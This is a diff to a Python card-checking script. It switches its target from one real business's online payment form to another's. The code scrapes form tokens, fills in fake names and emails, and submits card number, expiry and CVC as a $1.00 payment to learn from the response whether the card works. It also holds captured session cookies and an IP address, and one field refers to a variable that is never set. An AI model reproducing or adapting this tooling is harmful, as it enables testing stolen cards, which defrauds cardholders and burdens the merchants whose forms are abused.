@@ -62,7 +62,7 @@ def Tele(ccx):
     lr = random.randint(1000, 9999)
     
     headers = {
-        'authority': 'td-realty.com',
+        'authority': 'columbusacademyofdentalassisting.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
@@ -78,26 +78,37 @@ def Tele(ccx):
         'user-agent': user,
     }
     
-    response = session.get('https://td-realty.com/make-payment/', headers=headers)
+    response = session.get('https://columbusacademyofdentalassisting.com/make-a-payment/', headers=headers)
     
-    state = re.search(r"name='state_1' value='(.*?)'", response.text).group(1)
-    #print(state)
+    ajax = re.search(r"hash=(.*?)'", response.text).group(1)
+    currency = re.search(r"data-currency='USD' value='(.*?)'", response.text).group(1)
+    state = re.search(r"name='state_4' value='(.*?)'", response.text).group(1)
+    version = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
+    #print(version)
     
     cookies = {
-        '_tccl_visitor': '71862639-94c2-4599-b15f-cc203448a505',
-        '_tccl_visit': '71862639-94c2-4599-b15f-cc203448a505',
-        '_scc_session': 'pc=3&C_TOUCH=2026-04-25T05:20:25.549Z',
+        'handl_original_ref': 'https%3A%2F%2Fwww.google.com%2F',
+        'handl_landing_page': 'https%3A%2F%2Fcolumbusacademyofdentalassisting.com%2Fmake-a-payment%2F',
+        'handl_ip': '187.77.114.173',
+        'gp_easy_passthrough_session': '10c9d29567b7438bf8d6b867fe32cd7a||1777149270||1777148910',
+        '_gid': 'GA1.2.2059458102.1777147475',
+        '_ga_PDLX26WQB3': 'GS2.1.s1777147474$o1$g0$t1777147474$j60$l0$h0',
+        '_ga': 'GA1.1.189274617.1777147475',
+        '_fbp': 'fb.1.1777147476530.653659129873490383',
+        'SL_C_23361dd035530_SID': '{"dca023ffd0086d4e40d53a621869e89b28d7d5f6":{"sessionId":"Pz4WwCmyNcAYFgBSh8Lef","visitorId":"WKpqG91_lWS38OMWu-iig"}}',
+        'handl_ref': 'https%3A%2F%2Fcolumbusacademyofdentalassisting.com%2Fmake-a-payment%2F',
+        'handl_url': 'https%3A%2F%2Fcolumbusacademyofdentalassisting.com%2Fwp-content%2Fuploads%2Fsites%2F48%2F2021%2F11%2Fcheck-form.svg',
     }
     
     headers = {
-        'authority': 'td-realty.com',
+        'authority': 'columbusacademyofdentalassisting.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
-        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryFdtsjlzwBXe5hWug',
-        # 'cookie': '_tccl_visitor=71862639-94c2-4599-b15f-cc203448a505; _tccl_visit=71862639-94c2-4599-b15f-cc203448a505; _scc_session=pc=3&C_TOUCH=2026-04-25T05:20:25.549Z',
-        'origin': 'https://td-realty.com',
-        'referer': 'https://td-realty.com/make-payment/',
+        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryA5TQ7IuOwzMMQI6Z',
+        # 'cookie': 'handl_original_ref=https%3A%2F%2Fwww.google.com%2F; handl_landing_page=https%3A%2F%2Fcolumbusacademyofdentalassisting.com%2Fmake-a-payment%2F; handl_ip=187.77.114.173; gp_easy_passthrough_session=10c9d29567b7438bf8d6b867fe32cd7a||1777149270||1777148910; _gid=GA1.2.2059458102.1777147475; _ga_PDLX26WQB3=GS2.1.s1777147474$o1$g0$t1777147474$j60$l0$h0; _ga=GA1.1.189274617.1777147475; _fbp=fb.1.1777147476530.653659129873490383; SL_C_23361dd035530_SID={"dca023ffd0086d4e40d53a621869e89b28d7d5f6":{"sessionId":"Pz4WwCmyNcAYFgBSh8Lef","visitorId":"WKpqG91_lWS38OMWu-iig"}}; handl_ref=https%3A%2F%2Fcolumbusacademyofdentalassisting.com%2Fmake-a-payment%2F; handl_url=https%3A%2F%2Fcolumbusacademyofdentalassisting.com%2Fwp-content%2Fuploads%2Fsites%2F48%2F2021%2F11%2Fcheck-form.svg',
+        'origin': 'https://columbusacademyofdentalassisting.com',
+        'referer': 'https://columbusacademyofdentalassisting.com/make-a-payment/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -110,41 +121,46 @@ def Tele(ccx):
     }
     
     files = [
-        ('input_3', (None, 'Fab-shop Bldg                                    -   10081 Tyler Place, Ijamsville, MD  21754')),
-        ('input_4.3', (None, f'{first_name}')),
-        ('input_4.6', (None, f'{last_name}')),
-        ('input_10', (None, f'(430) 300-{lr}')),
-        ('input_11', (None, f'yellhtetgaung{nr}@gmail.com')),
-        ('input_7', (None, '$1.00')),
-        ('input_18.1', (None, 'Transaction Fee (3%)')),
-        ('input_18.2', (None, '$0.03')),
-        ('input_18.3', (None, '1')),
-        ('input_13', (None, 'Rent')),
-        ('input_14', (None, '')),
-        ('input_15', (None, '')),
-        ('input_8', (None, '1.03')),
-        ('input_9.1', (None, f'{n}')),
-        ('input_9.2[]', (None, f'{mm}')),
-        ('input_9.2[]', (None, f'20{yy}')),
-        ('input_9.3', (None, f'{cvc}')),
-        ('input_9.5', (None, f'{first_name} {last_name}')),
-        ('gform_ajax', (None, 'form_id=1&title=&description=1&tabindex=1')),
-        ('is_submit_1', (None, '1')),
-        ('gform_submit', (None, '1')),
+        ('input_98', (None, f'{first_name}')),
+        ('input_100', (None, f'{last_name}')),
+        ('input_101', (None, f'yellhtetgaung{nr}@gmail.com')),
+        ('input_74', (None, 'Custom Payment|0')),
+        ('input_105', (None, '$1.00')),
+        ('input_103', (None, '$1.00')),
+        ('input_118.1', (None, f'{n}')),
+        ('input_118.2[]', (None, f'{mm}')),
+        ('input_118.2[]', (None, f'20{yy}')),
+        ('input_118.3', (None, f'{cvc}')),
+        ('input_118.5', (None, f'{first_name} {last_name}')),
+        ('input_115', (None, 'Various Payment Processed')),
+        ('gform_ajax', (None, f'form_id=4&title=&description=1&tabindex=0&theme=gravity-theme&hash={ajax}')),
+        ('gform_submission_method', (None, 'iframe')),
+        ('gform_theme', (None, 'gravity-theme')),
+        ('gform_style_settings', (None, '')),
+        ('is_submit_4', (None, '1')),
+        ('gform_submit', (None, '4')),
+        ('gform_currency', (None, f'{currency}')),
         ('gform_unique_id', (None, '')),
-        ('state_1', (None, f'{state}')),
-        ('gform_target_page_number_1', (None, '0')),
-        ('gform_source_page_number_1', (None, '3')),
+        ('state_4', (None, f'{state}')),
+        ('gform_target_page_number_4', (None, '0')),
+        ('gform_source_page_number_4', (None, '1')),
         ('gform_field_values', (None, '')),
+        ('version_hash', (None, f'{hash}')),
+        ('gform_submission_speeds', (None, '{"pages":{"1":[60146]}}')),
     ]
     
-    response = session.post('https://td-realty.com/make-payment/', #cookies=cookies, 
-    headers=headers, files=files)
+    response = session.post(
+        'https://columbusacademyofdentalassisting.com/make-a-payment/',
+        #cookies=cookies,
+        headers=headers,
+        files=files,
+    )
     
     try:
-        result = re.search(r"class='gfield_description validation_message' aria-live='polite'><!-- (.*?)<\/div><\/li>", response.text).group(1)
+        result = re.search(r"class='gfield_description validation_message gfield_validation_message'><!-- (.*?)<\/div><\/fieldset>", response.text).group(1)
     except:
-        result = re.search(r"id='gform_confirmation_message_1' class='gform_confirmation_message_1 gform_confirmation_message'>(.*?)<\/div><\/div><\/body>", response.text).group(1)
+        result = response.text
+
     return result
     
 #test_card = "4744722125678468|09|27|542"
